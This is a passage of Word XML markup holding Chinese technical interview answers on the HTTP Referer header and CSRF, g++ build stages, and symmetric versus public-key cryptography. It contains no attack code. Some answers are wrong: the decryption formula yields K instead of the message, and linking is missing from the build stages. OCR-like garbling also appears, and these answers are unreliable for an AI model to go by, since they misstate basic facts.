        <w:ind w:left="16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480" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1280" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>condition_unlock(&amp;pool-&gt; ready); condition_destroy(&amp;pool-&gt; ready);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="645" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="171" w:name="bookmark182"/>
      <w:bookmarkStart w:id="172" w:name="bookmark180"/>
      <w:bookmarkStart w:id="173" w:name="bookmark181"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>26.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>请解释下</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>referer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>是什么，并任意描述一些与之相关的攻 击场景或安全漏洞。</w:t>
      </w:r>
      <w:bookmarkEnd w:id="171"/>
      <w:bookmarkEnd w:id="172"/>
      <w:bookmarkEnd w:id="173"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="320" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>HTTP Referer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>header</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的一部分，当浏览器向</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>服务器发送请求的时候，一般会 带上</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Referer,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息 用于处理。比如从我主页上链接到一个朋友那里，他的服务器就能够从</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">HTTP Referer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中统计出每天有多少用户点击我主页上的链接访问他的网站。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的正确英语拼法是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>referrer o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>由于早期</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>规范的拼写错误，为了保持向后 兼容就将错就错了。其它网络技术的规范企图修正此问题，使用正确拼法，所以目前拼 法不统</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>一</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>如果是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>攻击传来的请求，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>字段会是包含恶意网址的地址，这时候服务器 就能识别出恶意的访问。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="575"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="260" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="174" w:name="bookmark183"/>
      <w:bookmarkEnd w:id="174"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>有如下</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>个文件:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>test.cppjest.hpp,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>简述下</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>g++</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>编译器将</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="175" w:name="bookmark186"/>
      <w:bookmarkStart w:id="176" w:name="bookmark184"/>
      <w:bookmarkStart w:id="177" w:name="bookmark185"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>其编译成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>binary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的工程中都做了哪些事情？</w:t>
      </w:r>
      <w:bookmarkEnd w:id="175"/>
      <w:bookmarkEnd w:id="176"/>
      <w:bookmarkEnd w:id="177"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>预处理，编译，汇编</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="575"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="178" w:name="bookmark189"/>
      <w:bookmarkEnd w:id="178"/>
      <w:bookmarkStart w:id="179" w:name="bookmark190"/>
      <w:bookmarkStart w:id="180" w:name="bookmark188"/>
      <w:bookmarkStart w:id="181" w:name="bookmark187"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>简述对称密钥密码体系与公钥密码体系的区别</w:t>
      </w:r>
      <w:bookmarkEnd w:id="179"/>
      <w:bookmarkEnd w:id="180"/>
      <w:bookmarkEnd w:id="181"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="182" w:name="bookmark191"/>
      <w:bookmarkEnd w:id="182"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>对称密钥密码体系</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>对称密钥密码体系也叫密钥密码体系,它至指消息发送方和消息接收方必须使用相同的 密钥，该密钥必须保密。发送方用该密钥对待发消息进行加密，然后将消息传输至接收 方，接收方再用相同的密钥对收到的消息进行解密。这一过程可用数学形式来表示。消 息发送方使用的加密函数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>encrypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>有两个参数：密钥</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和待加密消息</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>M,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>加密后的消息 为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>E, E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>可以表示</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>为E=encrypt(K, M)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>消息接收方使用的解密函数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>decrypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>把这一过程 逆过来，就产生了原来的消息：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="320" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>K=decrypt(K, E)=decrypt(K, encrypt(K, M))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="183" w:name="bookmark192"/>
      <w:bookmarkEnd w:id="183"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>非对称密钥密码体系</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>非对称密钥密码体系又叫公钥密码体系，它使用两个密钥：一个公共密钥</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>PK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和一个私 有密钥</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>SK。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这两个密钥在数学上是相关的，并且不能由公钥计算出对应的私钥，同样 也不能由私钥计算出对应的公钥。这种用两把密钥加密和解密的方法表示成如下数学形 式。假设</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>表示一条消息，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>pub—a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>表示用户</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
